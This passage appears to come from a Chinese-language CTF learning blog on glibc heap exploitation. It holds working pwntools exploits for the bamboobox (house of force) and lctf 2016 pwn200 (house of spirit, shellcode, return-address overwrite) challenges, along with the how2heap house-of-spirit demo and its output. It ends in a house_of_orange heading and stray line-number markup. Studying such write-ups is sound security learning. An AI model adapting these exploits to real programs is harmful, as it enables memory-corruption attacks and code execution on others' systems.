<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>magic = <span class="hljs-number">0x400D49</span><br><br>sdla = <span class="hljs-keyword">lambda</span> infor, data : sh.sendlineafter(infor, data)<br>sda = <span class="hljs-keyword">lambda</span> infor, data : sh.sendafter(infor, data)<br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, context</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sda(<span class="hljs-string">&quot;Please enter the name of item:&quot;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">index, size, context</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    sdla(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sda(<span class="hljs-string">&quot;Please enter the new name of the item:&quot;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">index</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># top_chunk.size -&gt; -1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>change(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br><span class="hljs-comment"># req = dest - old_top - 0x10</span><br>req = -<span class="hljs-number">0x70</span><br>add(req, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>add(<span class="hljs-number">0x10</span>, p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>sh.recv()<br></code></pre></td></tr></table></figure>

<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>如果我们希望对一块fastbin大小的不可控内存区域进行读写，并恰好满足一下两个条件：</p>
<ul>
<li>该区域的前后可控</li>
<li>存在一个可控指针可以作为free()的参数</li>
</ul>
<p>该技术一般用来辅助栈溢出，假如我们能够覆盖一个即将被释放的指针，我们就可以将这个指针指向返回地址附近，并在附近构造一个fake_chunk，再利用该技术将fake_chunk变成一个真正的chunk。</p>
<p><strong>需要注意的是，<code>PREV_INUSE</code>位不会影响free的结果，但是<code>IS_MMAPPED</code>和<code>NON_MAIN_ARENA</code>都要为零，其次，fake_chunk的size要在32到128之间，next_chunk的size必须要大于0x10并且小于<code>av-&gt;system_mem</code>（即小于0x21000）。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br><br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a;<br><br>	<span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br><br>	fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br><br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br><br>	fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br><br>	a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(a);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This <span class="hljs-title function_">region</span> <span class="hljs-params">(memory of length: <span class="hljs-number">80</span>)</span> contains two chunks. The first starts at 0x7fffe5a3b378 and the second at 0x7fffe5a3b3b8.<br>This chunk.size of this region has to be 16 more than the <span class="hljs-title function_">region</span> <span class="hljs-params">(to accommodate the chunk data)</span> <span class="hljs-keyword">while</span> still falling into the fastbin <span class="hljs-title function_">category</span> <span class="hljs-params">(&lt;= <span class="hljs-number">128</span> on x64)</span>. The <span class="hljs-title function_">PREV_INUSE</span> <span class="hljs-params">(lsb)</span> bit is ignored by <span class="hljs-built_in">free</span> <span class="hljs-keyword">for</span> fastbin-sized chunks, however the <span class="hljs-title function_">IS_MMAPPED</span> <span class="hljs-params">(second lsb)</span> and <span class="hljs-title function_">NON_MAIN_ARENA</span> <span class="hljs-params">(third lsb)</span> bits cause problems.<br>... note that this has to be the size of the next <span class="hljs-built_in">malloc</span> request rounded to the internal size used by the <span class="hljs-built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="hljs-keyword">for</span> the <span class="hljs-built_in">malloc</span> parameter at the end. <br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*<span class="hljs-title function_">SIZE_SZ</span> <span class="hljs-params">(&gt; <span class="hljs-number">16</span> on x64)</span> &amp;&amp; &lt; av-&gt;<span class="hljs-title function_">system_mem</span> <span class="hljs-params">(&lt; <span class="hljs-number">128</span>kb by <span class="hljs-keyword">default</span> <span class="hljs-keyword">for</span> the main arena)</span> to pass the nextsize integrity checks. No need <span class="hljs-keyword">for</span> fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffe5a3b378.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next <span class="hljs-built_in">malloc</span> will <span class="hljs-keyword">return</span> the region of our fake chunk at 0x7fffe5a3b378, which will be 0x7fffe5a3b380!<br><span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x30</span>)</span>: 0x7fffe5a3b380<br></code></pre></td></tr></table></figure>



<h4 id="lctf-2016-pwn200"><a href="#lctf-2016-pwn200" class="headerlink" title="lctf_2016_pwn200"></a>lctf_2016_pwn200</h4><p>主要的攻击思路：</p>
<ol>
<li>将shellocode布置到栈上并且泄露rbp的值。</li>
<li>利用number_read函数布置next_size（需要查看汇编）。</li>
<li>在主函数调用sub_400A29()函数里布置fake_chunk，并覆盖ptr指向fake_chunk的用户区域。</li>
<li>释放fake_chunk，然后再申请，就会得到返回地址附近的控制权。</li>
<li>修改返回地址为shellcode的地址，攻击成功。</li>
</ol>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./pwn200&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 27191)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode = asm(shellcraft.amd64.linux.sh())<br><br><span class="hljs-comment">#leak</span><br>sh.recvuntil(<span class="hljs-string">&quot;who are u?&quot;</span>)<br>payload = shellcode<br>sh.send(payload)<br>sh.recvuntil(payload)<br>rbp = u64(sh.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span>)<br>log.info(<span class="hljs-string">&quot;rbp:&quot;</span> + <span class="hljs-built_in">hex</span>(rbp))<br><br>shellcode_addr = rbp - <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-string">&quot;shellcode_addr:&quot;</span> + <span class="hljs-built_in">hex</span>(shellcode_addr))<br>fake_ptr = shellcode_addr - <span class="hljs-number">0x40</span><br>log.info(<span class="hljs-string">&quot;fake_ptr:&quot;</span> + <span class="hljs-built_in">hex</span>(fake_ptr))<br><br><span class="hljs-comment">#fake_chunk</span><br>sh.sendlineafter(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>, <span class="hljs-string">b&#x27;65&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_ptr)<br>sh.sendafter(<span class="hljs-string">&quot;give me money~&quot;</span>, fake_chunk)<br><br><span class="hljs-comment"># gdb.attach(sh, &quot;b *0x400A82&quot;)</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">#free and malloc</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;how long?&quot;</span>, <span class="hljs-string">b&#x27;48&#x27;</span>)<br><br><span class="hljs-comment">#chang return_address</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(shellcode_addr)<br>sh.recv()<br>sh.sendline(payload)<br><br><span class="hljs-comment"># gdb.attach(sh)</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">#pwn</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span 